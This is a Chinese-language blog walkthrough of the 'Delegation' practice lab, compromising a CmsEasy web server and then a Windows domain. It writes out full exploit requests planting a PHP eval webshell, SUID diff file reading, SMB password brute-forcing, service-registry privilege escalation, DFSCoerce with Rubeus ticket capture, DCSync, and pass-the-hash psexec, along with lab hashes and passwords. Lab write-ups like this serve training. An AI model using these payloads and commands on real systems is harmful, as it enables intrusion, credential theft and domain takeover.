<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>春秋云镜-Delegation | X1NRI&#39;s trash</title>
  <meta name="author" content="X1NRI">
  
  <meta name="description" content="晋升荣耀黄金">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="春秋云镜-Delegation"/>
  <meta property="og:site_name" content="X1NRI&#39;s trash"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="X1NRI&#39;s trash" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-70812759-1');
</script>






<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">X1NRI&#39;s trash</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class="fa fa-archive"></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/categories" title="All the categories.">
			  <i class="fa fa-folder"></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class="fa fa-tags"></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class="fa fa-user"></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/links" title="Subscribe me.">
			  <i class="fa fa-chain"></i>Links
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> 春秋云镜-Delegation</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  
		 <div class="alert alert-success description">
			<i class="fa fa-info-circle"></i> 晋升荣耀黄金
		 </div> <!-- alert -->
	  		

	  <blockquote>
<p>Delegation是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有4个flag，分布于不同的靶机。</p>
</blockquote>
<ul>
<li>Brute Force</li>
<li>Privilege Elevation</li>
<li>Kerberos</li>
<li>域渗透<br><img src="/Rxi134_FILE/97e302b70dc81c13a88e7d0bb3ae6125_MD5.jpeg"></li>
</ul>
<h1 id="外网边界"><a href="#外网边界" class="headerlink" title="外网边界"></a>外网边界</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>访问ip<br><img src="/Rxi134_FILE/77e690e6406f42000631daf0de448928_MD5.jpeg"></p>
<p>不多废话，先简单打波poc<br><img src="/Rxi134_FILE/0d47b57396c183385b9c470e3e4d6a8e_MD5.jpeg"></p>
<p>好大个 cmseasy，看下源代码<br><img src="/Rxi134_FILE/dc74ed462524c5c4e1f0627aeb318d57_MD5.jpeg"></p>
<p>cmseasy 7.7.5，去 opencve 搜搜看<br><img src="/Rxi134_FILE/e41ec2a71f931b3b1342c7fafe9b2e34_MD5.jpeg"></p>
<h2 id="CmsEasy-V7-7-5-20210919-后台任意文件写"><a href="#CmsEasy-V7-7-5-20210919-后台任意文件写" class="headerlink" title="CmsEasy V7.7.5_20210919 后台任意文件写"></a>CmsEasy V7.7.5_20210919 后台任意文件写</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://jdr2021.github.io/2021/10/14/CmsEasy_7.7.5_20211012%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E5%92%8C%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#%E5%AE%89%E8%A3%85%E5%8C%85%E4%B8%8B%E8%BD%BD">CmsEasy_7.7.5_20211012存在任意文件写入和任意文件读取漏洞 | jdr</a></p>
<p>第一步要登录后台，看看有没有弱口令，&#x2F;admin 就是后台<br><img src="/Rxi134_FILE/dd6500576e7125f56f6aac1297804836_MD5.jpeg"></p>
<p>有验证码，不好爆破，试几个常用的弱口令</p>
<p>admin:123456进去了<br><img src="/Rxi134_FILE/619936f53d7c71ea84fc3aa3dbc2fce9_MD5.jpeg"></p>
<h3 id="获得驻足点"><a href="#获得驻足点" class="headerlink" title="获得驻足点"></a>获得驻足点</h3><p>poc如下：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1
Host: 39.99.128.51
Content-Length: 69
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded;
Cookie: PHPSESSID=7h6abk5jk11tvu8uf7cgab26mg; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
Connection: close

sid=#data_d_.._d_.._d_.._d_1.php&amp;slen=693&amp;scontent=&lt;?php phpinfo();?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>..&#x2F;..&#x2F; 就是根目录<br><img src="/Rxi134_FILE/0fe5a8b8ea2818c1f93657c86dca1be9_MD5.jpeg"></p>
<p>那直接写个php马即可</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /index.php?case=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1
Host: 39.99.128.51
Content-Length: 69
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0
Content-Type: application/x-www-form-urlencoded;
Cookie: PHPSESSID=7h6abk5jk11tvu8uf7cgab26mg; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313
Connection: close

sid=#data_d_.._d_.._d_.._d_hacker.php&amp;slen=693&amp;scontent=&lt;?php @eval($_POST['hacker']);?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="尝试获取flag（失败）"><a href="#尝试获取flag（失败）" class="headerlink" title="尝试获取flag（失败）"></a>尝试获取flag（失败）</h3><p>没有权限，看来得提权了<br><img src="/Rxi134_FILE/f9317944689dbc6a9a5097a3f9a56995_MD5.jpeg"></p>
<h3 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h3><p><img src="/Rxi134_FILE/309104a12ba4cd62dc3359e0437a3f19_MD5.jpeg"></p>
<p>伪终端命令：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>找配置文件<br><img src="/Rxi134_FILE/5cdffbf777e51926101319ab69a0c804_MD5.jpeg"></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">'password'=>'Root@O4oLkum3',//数据库密码
'user'=>'root',//数据库用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>尝试去ssh连一下，没成功</p>
<p>连上数据库，翻翻users表，啥也没有</p>
<p>试试UDF提权？没权限</p>
<p>上linpeas！</p>
<h2 id="suid-diff提权"><a href="#suid-diff提权" class="headerlink" title="suid-diff提权"></a>suid-diff提权</h2><p><img src="/Rxi134_FILE/745079cebc9aa2218770871d061382e3_MD5.jpeg"><br>diff 可以与任意文件比较输出差异，+suid 下跟空设备比较就能实现任意文件读</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">LFILE</span><span class="token operator">=</span>/home/flag/flag01.txt
./diff --line-format<span class="token operator">=</span>%L /dev/null <span class="token variable">$LFILE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/25e2bc30ecea207bf81936a26ecd7562_MD5.jpeg"></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _
 |  _"\ \| ___"|/ |"|    \| ___"|/U /"___|uU  /"\  u  |_ " _|     ___     \/"_ \/ | \ |"|
/| | | | |  _|" U | | u   |  _|"  \| |  _ / \/ _ \/     | |      |_"_|    | | | |&lt;|  \| |>
U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u
 |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|
  |||_   &lt;&lt;   >>  //  \\  &lt;&lt;   >>   _)(|_   \\    >>  _// \\_.-,_|___|_,-.  \\    ||   \\,-.
 (__)_) (__) (__)(_")("_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-' '-(_/  (__)   (_")  (_/

flag01: flag&#123;9a5e1ad5-2468-4950-a4b6-e7d71024847e&#125;

Great job!!!!!!

Here is the hint: WIN19\Adrian

I'll do whatever I can to rock you...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<p>给我们了一个hint🤔：WIN19\Adrian，还有rockyou</p>
<h1 id="搭建内网代理"><a href="#搭建内网代理" class="headerlink" title="搭建内网代理"></a>搭建内网代理</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./chisel server <span class="token parameter variable">-p</span> <span class="token number">19999</span> <span class="token parameter variable">-socks5</span>
./chisel client <span class="token number">39.99</span>.128.51:19999 socks <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="查看内网网段"><a href="#查看内网网段" class="headerlink" title="查看内网网段"></a>查看内网网段</h2><p>本机内网ip为 172.22.4.36，内外网段为 172.22.4.0&#x2F;24<br><img src="/Rxi134_FILE/3cdf1df7dbb2759e094f6ccd6bdce6c1_MD5.jpeg"></p>
<h2 id="fscan大保健"><a href="#fscan大保健" class="headerlink" title="fscan大保健"></a>fscan大保健</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./fscan <span class="token parameter variable">-h</span> <span class="token number">172.22</span>.4.0/24 <span class="token operator">></span> <span class="token number">1</span>.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>没扫到洞</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.4.7   DC01.xiaorang.lab
172.22.4.45  XIAORANG\WIN19
172.22.4.19  FILESERVER.xiaorang.lab<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>


<h2 id="尝试-AS-REP-Roasting（失败）"><a href="#尝试-AS-REP-Roasting（失败）" class="headerlink" title="尝试 AS-REP Roasting（失败）"></a>尝试 AS-REP Roasting（失败）</h2><p>我们不是有个 Adrian 用户名吗，试试看有没有关闭预认证</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains python GetNPUsers.py <span class="token parameter variable">-usersfile</span> /mnt/c/Users/Anonymous/Desktop/users.txt <span class="token parameter variable">-format</span> john -dc-ip <span class="token number">172.22</span>.4.7 xiaorang.lab/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/53b5d50f071ad38143545f7db4939384_MD5.jpeg"><br>失败</p>
<h2 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h2><p>SMB尝试下数据库密码：<code>Root@O4oLkum3</code>，也失败了</p>
<h2 id="拿下-XIAORANG-WIN19-172-22-4-45：smb密码爆破"><a href="#拿下-XIAORANG-WIN19-172-22-4-45：smb密码爆破" class="headerlink" title="拿下 XIAORANG\WIN19 172.22.4.45：smb密码爆破"></a>拿下 XIAORANG\WIN19 172.22.4.45：smb密码爆破</h2><p>题目提示rockyou，爆破SMB密码</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> netexec smb <span class="token number">172.22</span>.4.45 <span class="token parameter variable">-u</span> <span class="token string">"WIN19\Adrian"</span> <span class="token parameter variable">-p</span> rockyou.txt --ignore-pw-decoding<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>爆破到密码</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">WIN19\Adrian:babygirl1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/f4aa1ddaacef3e76071018d9d6205f0d_MD5.jpeg"></p>
<h3 id="密码过期问题"><a href="#密码过期问题" class="headerlink" title="密码过期问题"></a>密码过期问题</h3><p>显示密码过期<br><img src="/Rxi134_FILE/108e2d617a1f0a221b6912ced9090c9f_MD5.jpeg"></p>
<ul>
<li>使用 rdesktop 能够登上去更改密码<br><img src="/Rxi134_FILE/465127f8c44c2163757da7765bc8a503_MD5.jpeg"></li>
</ul>
<p>然后mstsc连接即可</p>
<h2 id="信息搜集-2"><a href="#信息搜集-2" class="headerlink" title="信息搜集"></a>信息搜集</h2><h3 id="凭据搜集"><a href="#凭据搜集" class="headerlink" title="凭据搜集"></a>凭据搜集</h3><p>没有找到什么可用的</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><h3 id="命名管道提权（失败）"><a href="#命名管道提权（失败）" class="headerlink" title="命名管道提权（失败）"></a>命名管道提权（失败）</h3><p><img src="/Rxi134_FILE/bce5143d1037a441a87e143380eb6f45_MD5.jpeg"></p>
<h3 id="privescCheck"><a href="#privescCheck" class="headerlink" title="privescCheck"></a>privescCheck</h3><p>我在桌面看到了一个文件夹 privescCheck ，<a target="_blank" rel="noopener" href="https://github.com/itm4n/PrivescCheck">PrivescCheck:</a> 是一个权限提升的检查脚本<br><img src="/Rxi134_FILE/c490b5bf0e99bb46899f8424d30c2452_MD5.jpeg"></p>
<p><img src="/Rxi134_FILE/11ea0e388bb21316c5d3e171cc53cd70_MD5.jpeg"></p>
<p>这里显示我们可以修改任意服务的注册表项</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Adrian<span class="token operator">></span>reg <span class="token function">add</span> <span class="token string">"HKLM\SYSTEM\CurrentControlSet\Services\gupdate"</span> /v ImagePath /t REG_EXPAND_SZ /d <span class="token string">"C:\Users\Adrian\Desktop\ma.exe"</span> /f
操作成功完成。

C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Adrian<span class="token operator">></span>sc qc gupdate
<span class="token punctuation">[</span>SC<span class="token punctuation">]</span> QueryServiceConfig 成功

SERVICE_NAME: gupdate
        TYPE               <span class="token builtin class-name">:</span> <span class="token number">10</span>  WIN32_OWN_PROCESS
        START_TYPE         <span class="token builtin class-name">:</span> <span class="token number">2</span>   AUTO_START  <span class="token punctuation">(</span>DELAYED<span class="token punctuation">)</span>
        ERROR_CONTROL      <span class="token builtin class-name">:</span> <span class="token number">1</span>   NORMAL
        BINARY_PATH_NAME   <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Adrian<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>ma.exe
        LOAD_ORDER_GROUP   <span class="token builtin class-name">:</span>
        TAG                <span class="token builtin class-name">:</span> <span class="token number">0</span>
        DISPLAY_NAME       <span class="token builtin class-name">:</span> Google 更新服务 <span class="token punctuation">(</span>gupdate<span class="token punctuation">)</span>
        DEPENDENCIES       <span class="token builtin class-name">:</span> RPCSS
        SERVICE_START_NAME <span class="token builtin class-name">:</span> LocalSystem

C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Adrian<span class="token operator">></span>sc start gupdate<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/Rxi134_FILE/3934ad67a61a5a85b86b746ef9a9256a_MD5.jpeg"><br>进去后赶紧进行一个migrate来驻足，不然服务一会会断掉<br><img src="/Rxi134_FILE/9cb5b98d830885a00b56ec550e4e6c26_MD5.jpeg"></p>
<blockquote>
<p>其实winpeas也能扫出来</p>
</blockquote>
<p><img src="/Rxi134_FILE/50e7861d237f5a1434c1d59ecff18a26_MD5.jpeg"></p>
<h3 id="获取flag02"><a href="#获取flag02" class="headerlink" title="获取flag02"></a>获取flag02</h3><p><img src="/Rxi134_FILE/873d6b8e265262e6359577e6d70de9b1_MD5.jpeg"></p>
<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::
Adrian:1003:aad3b435b51404eeaad3b435b51404ee:f67f5e3f66efd7298be6acd32eeeb27c:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                 
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e::: <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="mimikatz-抓取密码"><a href="#mimikatz-抓取密码" class="headerlink" title="mimikatz 抓取密码"></a>mimikatz 抓取密码</h3><p><img src="/Rxi134_FILE/58d8ac11e347b49eaf0dd520ca4836fc_MD5.jpeg"></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Username  Domain    NTLM                              SHA1                                     
Adrian    WIN19     f67f5e3f66efd7298be6acd32eeeb27c  78637967d96d8a30553a3840f4511bdafa4179d4 
WIN19$    XIAORANG  b1743cc34e7261e78d820e85d8b747ac  f02639be39bc20d3780862255c11896e6c44189c
WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>


<h2 id="域内信息搜集"><a href="#域内信息搜集" class="headerlink" title="域内信息搜集"></a>域内信息搜集</h2><p>我们终于到域中了<br><img src="/Rxi134_FILE/c5dff594ba172bf699faacfa77a1347e_MD5.jpeg"></p>
<ul>
<li>域用户<br><img src="/Rxi134_FILE/708075d12db6184e8e9503d0d3449963_MD5.jpeg"><br>Aldrich 和 Marcus 都是普通域用户</li>
</ul>
<h3 id="域内ACL"><a href="#域内ACL" class="headerlink" title="域内ACL"></a>域内ACL</h3><p>没发现什么</p>
<h3 id="域内委派"><a href="#域内委派" class="headerlink" title="域内委派"></a>域内委派</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 <span class="token parameter variable">-q</span> python findDelegation.py xiaorang.lab/<span class="token string">'WIN19$'</span> <span class="token parameter variable">-hashes</span> :b1743cc34e7261e78d820e85d8b747ac -dc-ip <span class="token number">172.22</span>.4.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/Rxi134_FILE/5f07954cbceffee78280b73b5950443c_MD5.jpeg"></p>
<h4 id="非约束委派-强制身份认证"><a href="#非约束委派-强制身份认证" class="headerlink" title="非约束委派+强制身份认证"></a>非约束委派+强制身份认证</h4><pre class="line-numbers language-text" data-language="text"><code class="language-text">proxychains -q python3 ./dfscoerce.py -u "WIN19$" -hashes :75c57edd62d1aa0a49f56a1e8a0becdb -d xiaorang.lab -dc-ip 172.22.4.7 WIN19.xiaorang.lab 172.22.4.7<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/bd45f344d3eb41ceecf0ffb6552d92fc_MD5.jpeg"></p>
<p>监听TGT</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Rubeus.exe monitor /interval:1 /filteruser:DC01$ /nowrap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/2ba81462298748333373241b63e9b1e9_MD5.jpeg"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Rubeus ptt /ticket:<span class="token operator">&lt;</span>b64 TGT<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/ceeef0aa9ed66e28257018a0dd5e951d_MD5.jpeg"></p>
<h4 id="mimikatz-dcsync"><a href="#mimikatz-dcsync" class="headerlink" title="mimikatz dcsync"></a>mimikatz dcsync</h4><p><img src="/Rxi134_FILE/a282d34242528e3b33a25b749385ec7a_MD5.jpeg"></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">502     krbtgt  767e06b9c74fd628dd13785006a9092b        514
1105    Aldrich 98ce19dd5ce74f670d230c7b1aa016d0        512
1106    Marcus  b91c7cc463735bf0e599a2d0a04df110        512
1112    WIN-3X7U15C2XDM$        c3ddf0ffd17c48e6c40e6eda9c9fbaf7        4096
1113    WIN-YUUAW2QG9MF$        125d0e9790105be68deb6002690fc91b        4096
1000    DC01$   d8272d6f460349f81dee4a84f15d5d9f        532480
500     Administrator   4889f6553239ace1f7c47fa2c619c252        512
1104    WIN19$  75c57edd62d1aa0a49f56a1e8a0becdb        528384
1103    FILESERVER$     b60e0379df027f690643fa1321f98802        4096<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


<h4 id="impackt-psexec"><a href="#impackt-psexec" class="headerlink" title="impackt-psexec"></a>impackt-psexec</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python psexec.py <span class="token string">"xiaorang.lab/administrator@172.22.4.19"</span> -dc-ip <span class="token number">172.22</span>.4.7 <span class="token parameter variable">-hashes</span> :4889f6553239ace1f7c47fa2c619c252<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/eb79f8b2cbcf3b0095b693fec7540c38_MD5.jpeg"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token parameter variable">-q</span> python psexec.py <span class="token string">"xiaorang.lab/administrator@172.22.4.7"</span> -dc-ip <span class="token number">172.22</span>.4.7 <span class="token parameter variable">-hashes</span> :4889f6553239ace1f7c47fa2c619c252<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="/Rxi134_FILE/121449d64ec0f79f1fae10b0e073a658_MD5.jpeg"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
<li><p>梳理一下整个内网思路：<br>smb爆破拿下 win1 远程桌面 –&gt; 注册表修改服务 ImagePath 提权SYSTEM 进入域 –&gt;  发现 win1 有非约束委派，PetitPotam&#x2F;DFSCoerce+Rubeus 获得域控的TGT –&gt; dcsync 导出用户hash接管整个域</p>
</li>
<li><p>我遇到的问题</p>
</li>
</ul>
<ol>
<li>那个密码过期问题，我远程桌面一连就断了，根本改不了密码。看来wp发现 <code>rdesktop</code> 可以正常连接。</li>
<li>学习了非约束委派+强制认证的组合拳</li>
</ol>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	<span id="/2025/03/05/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/" class="leancloud-visitors view" data-flag-title="春秋云镜-Delegation">
		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
	</span>
	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2025/03/01/2025-03第一周：2022蓝帽杯半决 Smurfs/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
		<section id="comments" class="comments">
			<style>
			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
			</style>
			<div id="vcomment" class="comment"></div>
<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<script>
var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
valineConfig.el='#vcomment';
new Valine(valineConfig);
    // new Valine({
    //     el: '#vcomment',
    //     appId: "",
    //     appKey: "",
    //     placeholder: "",
    //     avatar:"monsterid",
    //     visitor: "true",
    //     requiredFields: "nick,mail".split(','),
    // });
</script>

		</section>
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2025-03-05 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/pentest/">pentest<span>17</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/靶场/">靶场<span>12</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%A4%96%E7%BD%91%E8%BE%B9%E7%95%8C"><span class="toc-article-text">外网边界</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-article-text">信息搜集</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CmsEasy-V7-7-5-20210919-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99"><span class="toc-article-text">CmsEasy V7.7.5_20210919 后台任意文件写</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%8E%B7%E5%BE%97%E9%A9%BB%E8%B6%B3%E7%82%B9"><span class="toc-article-text">获得驻足点</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95%E8%8E%B7%E5%8F%96flag%EF%BC%88%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-article-text">尝试获取flag（失败）</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%B8%8A%E7%BA%BFmsf"><span class="toc-article-text">上线msf</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-1"><span class="toc-article-text">信息搜集</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#suid-diff%E6%8F%90%E6%9D%83"><span class="toc-article-text">suid-diff提权</span></a></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%90%AD%E5%BB%BA%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86"><span class="toc-article-text">搭建内网代理</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" 